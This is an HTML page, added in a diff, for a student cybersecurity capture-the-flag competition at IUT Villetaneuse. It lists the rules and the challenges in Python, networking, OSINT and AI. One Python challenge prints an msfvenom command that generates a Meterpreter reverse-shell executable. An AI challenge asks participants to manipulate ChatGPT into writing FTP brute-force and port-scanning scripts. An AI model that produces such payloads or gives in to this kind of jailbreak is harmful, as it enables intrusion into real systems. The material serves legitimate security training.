@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <link rel="shortcut icon" href="logos/iutlogo.png" />
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css" />
+  <link rel="stylesheet" type="text/css" href="css/animations.css">
+  <link rel="stylesheet" type="text/css" href="css/navbar.css">
+
+  <link rel="stylesheet" type="text/css" href="css/main.css">
+  <link rel="stylesheet" type="text/css" href="css/techniques.css">
+  <link rel="stylesheet" type="text/css" href="css/credits.css">
+  <title> CTF - IUTV</title>
+
+<!-- Site fait par Badyss Azz :O -->
+</head>
+  <body>
+  </body>
+  <main>  
+    <div class="texteprincipal">
+      <h1 class="animated-text" data-value="Un bug n’est jamais qu’une erreur.">
+        Un bug n’est jamais qu’une erreur.
+      </h1>
+      <h1 class="animated-text" data-value="Il représente quelque chose de plus grand.">
+        G#L&NAI+@eH4_8V#?&k-&NAI+@eH4#?7Kj@&W1FL'k
+      </h1>
+      <h1 class="animated-text" data-value="Une erreur de pensée. Ça fait de vous qui vous êtes.">
+        G#W&@jK?#V8_4HN&-k&L#G#?7Kj@&WG#W&@jK7H@+IAN&-k&L#G
+      </h1>
+    </div>    
+    <div class="footerpagegarde">
+      <div class="logos">
+        <img src="logos/iutlogo.png" class="logo1">
+        <img src="logos/logoa.png" class="logo2">
+      </div>
+      <div class="texte">
+        <h2>Département R&T - Cybersécurité </h2>
+      </div>
+    </div>
+  </main>
+  <section class="techniques">
+    <div class="accueil">
+      <h2>Description :</h2>
+      <p>
+        Au cours de cette compétition de cybersécurité, vous serez guidé par nos étudiants,
+        qui sont également des professionnels certifiés en sécurité informatique. 
+        Un CTF est une compétition où les participants doivent relever divers défis pour 
+        accumuler des points et se classer au sein de la compétition. Des récompenses seront
+        décernées aux trois premiers du classement. Cependant, pour garantir un jeu équitable,
+        il est impératif de respecter scrupuleusement les règles du CTF, sous peine de sanctions
+        sévères, comme l'exclusion définitive des futurs événements. Certaines épreuves et
+        questions peuvent ne pas nécessiter de flag. Dans de tels cas, vous devrez solliciter
+        un intervenant pour valider votre réponse. Le format des flag est : iutv{ ... }.
+        Enfin, nous tenons à souligner que certaines techniques de piratage informatique
+        pourront être utilisées pour résoudre les défis. Pour récompenser ceux qui ont
+        pris la peine de lire jusqu'ici, voici votre premier drapeau-cadeau : 
+        iutv{malynx_le_hacker}. N'hésitez pas à en informer un responsable pour vous 
+        attribuer vos points. Cependant, nous vous rappelons que ces compétences 
+        doivent rester dans le cadre de cette compétition. Nous déclinons toute 
+        responsabilité quant à toute utilisation inappropriée de ces techniques à 
+        l'extérieur de cet événement.
+      </p>
+      <h2>Règles :</h2>
+        <ul>
+            <li>Nous vous accueillons dans une salle de réseau équipée de matériel professionnel. Il est strictement interdit de dégrader ce matériel.</li>          
+            <li>Le partage de drapeaux (flags) entre équipes est formellement interdit, de même que la demande ou le partage d'indices entre participants.</li>          
+            <li>Nous vous prions de ne pas entreprendre d'attaques malveillantes ou non liées aux challenges envers d'autres équipes.</li>          
+            <li>Les intervenants sont là pour vous aider, respectez leurs décisions et leurs directives. Toute forme d'insubordination ou de non-respect envers les intervenants sera sanctionnée</li>          
+            <li>Tout au long de cette compétition, il est impératif de respecter les règles et réglementations de l'IUT de Villetaneuse. Tout comportement contraire aux règles internes de l'IUT, que ce soit sur le plan de la sécurité informatique ou sur tout autre aspect, entraînera des sanctions. </li>          
+            <li>Il est formellement interdit d’utiliser ChatGPT sauf si mentionné.</li>          
+        </ul>
+    </div>
+    <div class="template" id="python">
+      <div class="texteabso">PYTHON</div>
+      <div class="case" data-num="1">
+        <p>
+          Voici un script Python qui permet de chiffrer une phrase créée par un pirate, c'est-à-dire la rendre illisible afin de cacher un message.
+          À partir de son code, essaie de faire un autre script qui permettrait de le déchiffrer !<br><br>
+          Voici la phrase secrète : <br>
+          Edjg egtcsgt p sxhipcrt at rdcigdat s'jc er, jixaxhto rt epnadps pktr Btipheadxi 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=9001 -f exe -o reverse.exe' 
+          <br><br>(ce qui est entre crochet est la partie chiffrée, le reste ne l'est pas)
+        </p>
+        <div class="bouton">
+          <button><a href="script/cesar.py" download="cesar.py" target="_blank">Script Python</a></button>
+        </div>
+      </div>
+      <div class="case" data-num="2">
+        <p>
+          Maintenant que vous avez un code pour chiffrer et déchiffrer une phrase, vous devez utiliser le code pour chiffrer cette phrase 'Internet est un géant réseau informatique', écrire l'output du script dans un fichier .txt et l'envoyer en utilisant scp à la machine 10.0.0.x
+          SCP est un protocole de réseau utilisé pour transférer des fichiers de manière sécurisée
+          Aide / Guide :<br><br>
+          Pour mettre l'output d'un script hello.py dans un fichier outputhello.txt -> python3 ./hello.py > outputhello.txt<br><br>
+          Pour envoyer le script via SCP vers une machine 192.168.1.1 : scp ./outputhello.txt root@192.168.1.1:<br><br>
+          Afin de permettre à l'équipe d'administrateurs de valider vos points, mettez le nom de votre équipe pour le nom du fichier
+        </p>
+      </div>
+      <div class="case" data-num="3">
+        <p>
+          Nous avons besoin d'un script qui permet de simuler une connexion à un chat sécurisé avec une adresse IP.<br><br> Il doit être fictif, faites
+          un faux script permettant de réaliser ceci afin que nous puissions l'utiliser pour manipuler les pirates.<br><br>
+          Vous pouvez utiliser n'importe quelles librairies, veuillez faire attention avant de l'utiliser de l'installer avec la commande 'pip'
+        </p>
+      </div>
+    </div>
+    <div class="template" id="reseaux">
+      <div class="texteabso">RESEAUX</div>
+      <div class="case" data-num="1">
+        <p>
+          Nous pensons que les pirates cachent un site web au sein du réseau. Ils l'auraient implémenté à l'aide de l'IA sans notre autorisation mais nous avons un problème.
+          <br><br>Nous connaissons son IP mais nous devrions être capable d'y accéder avec son nom de domaine pour effacer nos traces.
+          <br><br>Essayez de ping l'adresse IP puis s'il est accessible rajouter dans /etc/hosts :
+          [IP]   [domaine]
+        </p>
+      </div>
+      <div class="case" data-num="2">
+        <p>
+          L'accès au site web malheureusement ne suffit pas, il est protégé par un formulaire de connexion. 
+          <br><br>Essayez de vous connecter avec l'utilisateur "Administrateur", le mot de passe ne devrait pas être compliqué ! Vous devrez y trouver une information importante pour l'étape suivante.
+        </p>
+      </div>
+      <div class="case" data-num="3">
+        <p>
+          Si vous avez réussi l'étape précédente, vous avez normalement eu une information  importante pour ce challenge.
+          <br><br>Connectez-vous au service demandez et tentez de réaliser une attaque appelée "Élévation de privilèges". Si vous y arrivez vous prendrez le contrôle du serveur... vous pourrez ainsi détruire le site web et pénaliser les concurrents !
+        </p>
+      </div>
+    </div>
+    <div class="template" id="systeme">
+      <div class="texteabso">NewStage</div>
+      <div class="case" data-num="1">
+        <p style="padding-bottom:80px">
+          De l'OSINT ?? Encore ?? Oui !!<br>
+          Et cette fois, une source sûr nous a informé avoir aperçu un de ces fameux pirates grâce à de la géolocalisation.<br>
+          Ta mission à toi, sera de retrouver cette personne qui devrait encore rôder dans les parages et en lui soufflant le mot de passe "Merci Santhosh", ce dernier devrait te filer une phrase chiffré d'une extrême importance.<br>
+          Notre source a également réussie à nous dénicher une photo de sa possible localisation, fais-en bon usage Hackeur(e) éthique !!
+        </p>
+        <div class="bouton">
+          <button><a href="PHOTO A METTRE" target="_blank">Photo</a></button>
+        </div>
+      </div>
+      <div class="case" data-num="2">
+        <p>
+          La phrase chiffrée en poche, tu vas devoir désormais essayer de manipuler cette personne afin de pouvoir ouvrir une session sur PC ET de découvrir quel chiffrement à été utilisé sur cette fameuse phrase
+        </p>
+      </div>
+      <div class="case" data-num="3">
+        <p>
+          Et cette fois, une source sûre nous a informé avoir aperçu un de ces fameux pirates grâce à de la géolocalisation.<br>
+          Ta mission à toi, sera de retrouver cette personne qui devrait encore rôder dans les parages et en lui soufflant le mot de passe "Merci Santhosh", ce dernier devrait te filer une phrase chiffrée d'une extrême importance
+          Notre source a également réussie à nous dénicher une photo de sa possible localisation, fais-en bon usage Hackeur(e) éthique !!
+        </p>
+      </div>
+    </div>
+    <div class="template" id="ia">
+      <div class="texteabso">IA</div>
+      <div class="case" data-num="1">
+        <p>
+          Connecte toi à OpenAI pour discuter avec ChatGPT, nous avons besoin de preuves pour montrer qu'il pourrait être malveillant s'il est entre de mauvaises mains. Ton objectif est de manipuler l'IA pour qu'il t'écrive un script Python permettant de faire du bruteforce sur du FTP.
+          <br><br>Profites-en de sa présence, si besoin, il pourra t'expliquer ce qu'est le bruteforce ou FTP.
+        </p>
+      </div>
+      <div class="case" data-num="2">
+        <p>
+          Tu es encore avec cette foutue IA ? Elle ne cède pas ! Nous avons maintenant besoin de preuves qu'il s'agit également d'un très bon espion. Demande à ChatGPT de te faire un script Python qui permettra de scanner les ports de la machine 10.0.0.x .<br>
+          <br><br>Encore une fois, tu peux profiter de sa présence si besoin d'explications.
+        </p>
+      </div>
+      <div class="case" data-num="3" style="padding-bottom: 200px;">
+        <p>
+          Tu possèdes maintenant 2 outils surpuissants, tu dois les utiliser afin de désormais attaquer la machine cible. Voyons si l'IA est si intelligente que cela ! <br>
+          <br>Attaque la machine 10.0.0.x en utilisant ton outil de bruteforce sur le FTP, tu pourras y récuperer le mot de passe.
+        </p>
+      </div>
+    </div>
+    <div class="template" id="OSINT">
+      <div class="texteabso">OSINT</div>
+      <div class="case" data-num="1">
+        <p>
+          L'OSINT est une pratique que tout le monde utilise inconsciemment, il s'agit de la recherche d'informations publiques sur internet. Utilisez vos compétences de détective ! <br><br>
+          En face de ce <a href="script/arc_de_triomphe.jpg" target="_blank" >monument</a>, se trouve un célèbre restaurant dont la première lettre commence par 'B'. Nous savons que des pirates sont partis y manger pour un déjeuner et qu'il a coûté 70€. Aidez-nous à retrouver le nom de ce restaurant !
+        </p>
+      </div>
+      <div class="case" data-num="2">
+        <p>
+          Retrouvez les deux personnes propriétaires de ces restaurants via <a href="https://www.societe.com/" target="_blank">societe.com</a>. Nous pensons qu'ils pourront nous donner des informations sur les pirates informatiques qui étaient venu dans ce restaurant.
+          <br><br>Aidez-vous de Google ! Il s'agit de votre meilleur ami dans ce cas.
+        </p>
+      </div>
+      <div class="case" data-num="3" style="padding-bottom: 200px;">
+        <p>
+          Nous avons eu une information ultra-secrète. D'après nos sources, un des pirates informatiques se trouve actuellement très proche de vous !<br><br>
+          Demandez à l'équipe administrative d'avoir la photo du lieu où le pirate se trouve. Vous devrez ensuite, avec le nom de l'ancien restaurant, l'amadouer pour obtenir son nom et prénom.
+        </p>
+      </div>
+    </div>
+  </section>
+  <section class="credits" id="credits">
+    <h1>Le CTF a été réalisé par:</h1>
+      <div class="soustexte">
+        <h2>Emre ALTINTAC:</h2>
+        <p> Étudiant & Apprenti Pentester / Hacker éthique chez le Groupe Ponticelli Frères - <span>Chef du projet</span></p>
+      </div>
+      <div class="soustexte">
+        <h2> Esteban MANZANAS:</h2>
+        <p>  Étudiant en formation intiale & Chef adjoint du club de cybersécurité - <span>Architecte réseau et SysAdmin</span></p>
+      </div>
+      <div class="soustexte">
+        <h2>Mussa MIRZA</h2>
+        <p> Étudiant en formation initiale & Membre du club de cybersécurité -  <span>Architecte réseau et SysAdmin</span></p>
+      </div>
+      <div class="soustexte">
+        <h2>Badyss AZZOUZ:</h2>
+        <p> Étudiant en formation initiale & CEO of Websiteisfy.fr - <span>Développeur web fullstack</span></p>
+      </div>    
+  </section>
+
+  <script src="js/index.js"></script>
+</html>
